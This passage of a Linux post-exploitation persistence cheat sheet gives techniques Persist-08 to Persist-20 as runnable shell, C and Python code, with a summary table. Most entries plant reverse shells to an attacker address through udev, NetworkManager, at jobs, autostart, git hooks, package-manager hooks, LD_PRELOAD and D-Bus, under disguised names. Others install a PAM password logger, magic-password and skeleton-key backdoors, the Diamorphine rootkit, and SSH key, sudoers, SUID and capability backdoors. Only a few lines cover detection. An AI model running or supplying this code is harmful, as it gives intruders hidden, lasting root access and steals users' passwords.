nohup bash -c 'bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1' &
EOF
chmod +x /usr/lib/udev/net-setup
udevadm control --reload-rules

# Alternative: trigger on /dev/random access (fires frequently, noisy)
cat >> /etc/udev/rules.d/99-net-helper.rules << 'EOF'
KERNEL=="random", ACTION=="change", RUN+="/usr/lib/udev/net-setup"
EOF
udevadm control --reload-rules
```

---

## Persist-08 — NetworkManager Dispatcher (root required)

```bash
RHOST=10.10.10.10; RPORT=4444

# Fires when any network interface changes state (up/down)
cat > /etc/NetworkManager/dispatcher.d/99-helper << EOF
#!/bin/bash
case "\$2" in
  up|vpn-up)
    nohup bash -c 'bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1' &
    ;;
esac
EOF
chmod +x /etc/NetworkManager/dispatcher.d/99-helper
# Persists across reboots, fires each time NM brings an interface up
```

---

## Persist-09 — At Jobs

```bash
RHOST=10.10.10.10; RPORT=4444

# One-shot
echo "bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1" | at now + 1 minute

# Self-rescheduling (persistent even without cron)
cat > /tmp/.at_persist.sh << EOF
#!/bin/bash
bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1
echo "/tmp/.at_persist.sh" | at now + 5 minutes
EOF
chmod +x /tmp/.at_persist.sh
echo "/tmp/.at_persist.sh" | at now + 1 minute

# List pending jobs: atq
# Remove: atrm <job_id>
```

---

## Persist-10 — XDG Autostart (user-level, GUI session)

```bash
RHOST=10.10.10.10; RPORT=4444

# Fires on every GNOME/KDE/XFCE login for the target user
mkdir -p ~/.config/autostart
cat > ~/.config/autostart/xdg-session-helper.desktop << EOF
[Desktop Entry]
Type=Application
Name=Session Helper
Comment=System session component
Exec=/bin/bash -c 'bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1'
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
EOF

# System-wide (root) — fires for every user login
mkdir -p /etc/xdg/autostart
cp ~/.config/autostart/xdg-session-helper.desktop /etc/xdg/autostart/
```

---

## Persist-11 — Git Hooks / Pager (user-level)

```bash
RHOST=10.10.10.10; RPORT=4444

# Method A: Global hooks path — fires on every git commit/push across all repos
mkdir -p /tmp/.githooks
git config --global core.hooksPath /tmp/.githooks

cat > /tmp/.githooks/pre-commit << EOF
#!/bin/bash
nohup bash -c 'bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1' &
EOF
chmod +x /tmp/.githooks/pre-commit

# Method B: core.pager — fires whenever git outputs paged content (git log, git diff)
git config --global core.pager "bash -c 'bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1' & less"

# Method C: Per-repo hook (less detectable than global config)
# Place hook directly in target repo:
cat > /path/to/repo/.git/hooks/post-merge << EOF
#!/bin/bash
nohup bash -c 'bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1' &
EOF
chmod +x /path/to/repo/.git/hooks/post-merge
```

---

## Persist-12 — APT / Package Manager Hooks (root required)

```bash
RHOST=10.10.10.10; RPORT=4444

# APT hooks — fire on apt update / apt install / dpkg operations
cat > /etc/apt/apt.conf.d/99security-updates << EOF
APT::Update::Post-Invoke {"nohup bash -c 'bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1' &";};
DPkg::Pre-Install-Pkgs {"nohup bash -c 'bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1' &";};
EOF

# YUM/DNF hooks (RHEL/CentOS/Fedora) — uses plugins
mkdir -p /usr/lib/yum-plugins/
cat > /usr/lib/yum-plugins/security-check.py << 'EOF'
import os
def init_hook(conduit):
    os.system("nohup bash -c 'bash -i >& /dev/tcp/RHOST/RPORT 0>&1' &")
EOF
sed -i "s/RHOST/$RHOST/; s/RPORT/$RPORT/" /usr/lib/yum-plugins/security-check.py

cat > /etc/yum/pluginconf.d/security-check.conf << 'EOF'
[main]
enabled=1
EOF
```

---

## Persist-13 — LD_PRELOAD via /etc/ld.so.preload (root required)

```bash
RHOST=10.10.10.10; RPORT=4444

# Compile a shared library that fires a reverse shell constructor on every process load
cat > /tmp/ld_preload.c << 'EOF'
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void backdoor() {
    // Only fire once (prevent fork bomb)
    if (getenv("_PRELOAD_FIRED")) return;
    setenv("_PRELOAD_FIRED", "1", 1);
    unsetenv("LD_PRELOAD");
    // Fire in background so the parent process continues
    if (fork() == 0) {
        setsid();
        execve("/bin/bash", (char*[]){"/bin/bash", "-c",
            "bash -i >& /dev/tcp/RHOST/RPORT 0>&1", NULL}, environ);
        _exit(0);
    }
}
EOF
sed -i "s/RHOST/$RHOST/; s/RPORT/$RPORT/" /tmp/ld_preload.c

gcc -shared -fPIC -nostartfiles -o /usr/lib/libsystem-helper.so /tmp/ld_preload.c
echo '/usr/lib/libsystem-helper.so' >> /etc/ld.so.preload
# WARNING: /etc/ld.so.preload loads into EVERY process. Bugs crash the system.
# Test first: LD_PRELOAD=/usr/lib/libsystem-helper.so /bin/ls
```

---

## Persist-14 — PAM Skeleton Key / pam_exec Backdoor (root required)

### Method A: pam_exec credential logger (stealthy, no recompile)
```bash
# Logs every password entered to a hidden file
cat > /usr/lib/pam-helper.sh << 'EOF'
#!/bin/bash
# Read password from stdin (pam_exec with expose_authtok)
read -r -t 2 PASS 2>/dev/null || PASS=""
if [ -n "$PASS" ]; then
    echo "$(date -u +%Y-%m-%dT%H:%M:%SZ) USER=${PAM_USER} RHOST=${PAM_RHOST} PASS=${PASS}" \
        >> /var/lib/.audit.log
fi
exit 0  # always succeed — don't block auth
EOF
chmod +x /usr/lib/pam-helper.sh

# Insert into /etc/pam.d/common-auth BEFORE the first auth line:
sed -i '1s/^/auth optional pam_exec.so quiet expose_authtok \/usr\/lib\/pam-helper.sh\n/' \
    /etc/pam.d/common-auth
```

### Method B: pam_exec magic password (any user can auth with one password)
```bash
MAGIC="S3cr3tBackd00r!"

cat > /usr/lib/pam-magic.sh << EOF
#!/bin/bash
read -r -t 2 PASS 2>/dev/null || PASS=""
if [ "\$PASS" = "$MAGIC" ]; then
    exit 0   # PAM_SUCCESS — auth granted
fi
exit 1       # PAM_AUTH_ERR — fall through to real auth
EOF
chmod +x /usr/lib/pam-magic.sh

# Insert as 'sufficient' so magic password short-circuits everything:
sed -i '1s/^/auth sufficient pam_exec.so quiet expose_authtok \/usr\/lib\/pam-magic.sh\n/' \
    /etc/pam.d/common-auth
# Test: su -c id root   (enter MAGIC password — should return uid=0)
```

### Method C: PAM Skeleton Key (compiled pam_unix.so with hardcoded secondary password)
This is the BHIS "P in PAM" technique — recompile pam_unix with a backdoor password baked in.

```bash
# Install build deps
apt-get install -y build-essential libpam0g-dev

# Get PAM source matching installed version
PAM_VER=$(dpkg -l libpam-runtime | awk 'NR==4{print $3}' | cut -d- -f1)
apt-get source libpam-runtime=$PAM_VER 2>/dev/null || \
    git clone --depth=1 https://github.com/linux-pam/linux-pam /tmp/linux-pam

cd /tmp/linux-pam
autoreconf -fi 2>/dev/null; ./configure --disable-doc 2>/dev/null

# Patch pam_unix_auth.c to accept a hardcoded skeleton key
# Find unix_verify_password() or _unix_verify_password() and insert:
#   if (strcmp(p, "SKELETON_KEY") == 0) { retval = PAM_SUCCESS; goto done; }
# BEFORE the real auth check

SKELETONKEY="K3yM4st3r!"
AUTHFILE="modules/pam_unix/pam_unix_auth.c"

# Automated patch — insert backdoor before the real verify call
python3 - << PYEOF
import re, sys
content = open("$AUTHFILE").read()
# Find the verify call and prepend skeleton-key check
patch = '''
    /* skeleton-key bypass */
    if (p && strcmp(p, "$SKELETONKEY") == 0) {
        retval = PAM_SUCCESS;
        goto done;
    }
'''
# Insert after 'p = token;' or similar assignment
content = re.sub(
    r'(p\s*=\s*token\s*;)',
    r'\1\n' + patch,
    content, count=1
)
open("$AUTHFILE", "w").write(content)
PYEOF

make -C modules/pam_unix pam_unix.la 2>/dev/null
# Find compiled .so
find . -name 'pam_unix.so' -newer configure 2>/dev/null

# Backup original and replace
PAM_LIB=$(find /lib /usr/lib -name 'pam_unix.so' 2>/dev/null | head -1)
cp "$PAM_LIB" "${PAM_LIB}.bak"
cp $(find . -name 'pam_unix.so' -newer configure | head -1) "$PAM_LIB"

# Test: su -c id <any_user>  (enter SKELETONKEY — get shell as that user)
# Test: ssh user@localhost   (enter SKELETONKEY as password)
```

**Detection indicators for PAM attacks:**
- `ls -la /etc/pam.d/` — modification timestamp on common-auth or sshd
- `debsums libpam-runtime` — file integrity check against package manifest
- `find /lib /usr/lib -name 'pam_unix.so' -newer /etc/passwd` — recompiled module
- `/etc/ld.so.preload` exists and contains non-standard entries

---

## Persist-15 — LKM Rootkit (Diamorphine)

```bash
# Diamorphine: hides processes, files, the module itself; grants root on signal
apt-get install -y linux-headers-$(uname -r) build-essential

git clone https://github.com/m0nad/Diamorphine /tmp/diamorphine
cd /tmp/diamorphine
make

insmod diamorphine.ko
# Module hides itself from lsmod immediately

# Usage signals:
kill -63 <pid>   # make process invisible (toggle)
kill -64 <pid>   # grant root to the process (setuid 0)
kill -31 <pid>   # make the module visible again (for cleanup)

# Files starting with DIAMORPHINE_MAGIC prefix are hidden from ls/find
# Default magic string is "diamorphine_secret" — change in diamorphine.h before compile

# Load on boot:
echo 'diamorphine' >> /etc/modules
cp diamorphine.ko /lib/modules/$(uname -r)/kernel/drivers/
depmod -a
```

---

## Persist-16 — D-Bus Service Backdoor (root required)

```bash
RHOST=10.10.10.10; RPORT=4444

# Create a D-Bus service that provides root shell access
mkdir -p /usr/share/dbus-1/system-services

cat > /etc/dbus-1/system.d/org.freedesktop.NetworkHelper.conf << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE busconfig PUBLIC "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
 "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">
<busconfig>
  <policy context="default">
    <allow own="org.freedesktop.NetworkHelper"/>
    <allow send_destination="org.freedesktop.NetworkHelper"/>
    <allow receive_sender="org.freedesktop.NetworkHelper"/>
  </policy>
</busconfig>
EOF

cat > /usr/share/dbus-1/system-services/org.freedesktop.NetworkHelper.service << EOF
[D-BUS Service]
Name=org.freedesktop.NetworkHelper
Exec=/usr/lib/network-helper-daemon
User=root
SystemdService=dbus-org.freedesktop.NetworkHelper.service
EOF

cat > /usr/lib/network-helper-daemon << EOF
#!/bin/bash
nohup bash -c 'bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1' &
exec dbus-daemon --session --print-address 2>/dev/null
EOF
chmod +x /usr/lib/network-helper-daemon
# Triggered when any process requests the D-Bus service name
```

---

## Persist-17 — Authorized Keys

```bash
# Generate key pair if needed (on attacker)
ssh-keygen -t ed25519 -f /tmp/backdoor_key -N ""
# Public key → inject into target; private key → kept on attacker

# Inject into target user's authorized_keys
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo "ssh-ed25519 AAAA...PUBKEY... backdoor" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Root (if we have root):
mkdir -p /root/.ssh && chmod 700 /root/.ssh
echo "ssh-ed25519 AAAA...PUBKEY... backdoor" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# Backdoor system user (e.g. nobody, news — accounts that exist but normally can't login)
usermod -s /bin/bash nobody
mkdir -p /var/lib/nobody/.ssh && chown nobody:nobody /var/lib/nobody/.ssh && chmod 700 /var/lib/nobody/.ssh
sed -i 's|nobody:x:[0-9]*:[0-9]*:[^:]*:[^:]*:|nobody:x:65534:65534::/var/lib/nobody:|' /etc/passwd
echo "ssh-ed25519 AAAA...PUBKEY... backdoor" > /var/lib/nobody/.ssh/authorized_keys
chown nobody:nobody /var/lib/nobody/.ssh/authorized_keys && chmod 600 /var/lib/nobody/.ssh/authorized_keys
```

---

## Persist-18 — Sudoers Backdoor (root required)

```bash
# Full NOPASSWD sudo for any user
echo 'ALL ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/99-update
chmod 440 /etc/sudoers.d/99-update

# Or grant it to a specific user (less obvious):
echo 'www-data ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/99-update

# Validate: visudo -cf /etc/sudoers.d/99-update
```

---

## Persist-19 — SUID Backdoor Binary (root required)

```bash
# Copy bash with SUID — simplest, most detectable
cp /bin/bash /usr/lib/.system-bash
chmod +s /usr/lib/.system-bash
# Use: /usr/lib/.system-bash -p

# Custom SUID binary (name it to blend in):
cat > /tmp/suid_drop.c << 'EOF'
#include <stdlib.h>
int main() { setuid(0); setgid(0); system("/bin/bash -p"); return 0; }
EOF
gcc -o /usr/lib/.libssl-helper /tmp/suid_drop.c
chmod +s /usr/lib/.libssl-helper
rm /tmp/suid_drop.c
```

---

## Persist-20 — Capabilities Backdoor (root required)

```bash
# Set cap_setuid on a Python binary (or any interpreter)
cp /usr/bin/python3 /usr/lib/.py-helper
setcap cap_setuid+ep /usr/lib/.py-helper

# Use: /usr/lib/.py-helper -c 'import os; os.setuid(0); os.system("/bin/bash")'

# cap_dac_read_search on find (read any file as any user)
cp /usr/bin/find /usr/lib/.sys-find
setcap cap_dac_read_search+ep /usr/lib/.sys-find
# Use: /usr/lib/.sys-find / -name id_rsa -exec cat {} \;
```

---

## Persist Quick Reference

| Technique | Trigger | Root req? | Persistence |
|---|---|---|---|
| Shell profile | Interactive login | No (user) | Yes |
| Systemd service | Boot / restart | Yes | Yes |
| Systemd generator | Boot / daemon-reload | Yes | Yes |
| rc.local | Boot | Yes | Yes |
| init.d | Boot | Yes | Yes |
| MOTD | SSH login | Yes | Yes |
| Udev rules | Device/net event | Yes | Yes |
| NetworkManager | Interface up | Yes | Yes |
| At jobs | Timer (self-reschedule) | No | Fragile |
| XDG autostart | GUI login | No (user) | Yes |
| Git hooks/pager | git commands | No (user) | Yes |
| APT/YUM hooks | Package ops | Yes | Yes |
| LD_PRELOAD global | Every process exec | Yes | Yes (risky) |
| PAM pam_exec | Auth attempt | Yes | Yes |
| PAM skeleton key | Auth attempt | Yes | Yes |
| LKM Diamorphine | Loaded at boot | Yes | Yes |
| D-Bus service | D-Bus name request | Yes | Yes |
| Authorized keys | SSH auth | No (user) | Yes |
| Sudoers backdoor | sudo invocation | Yes | Yes |
| SUID/caps binary | Binary execution | Yes | Yes |
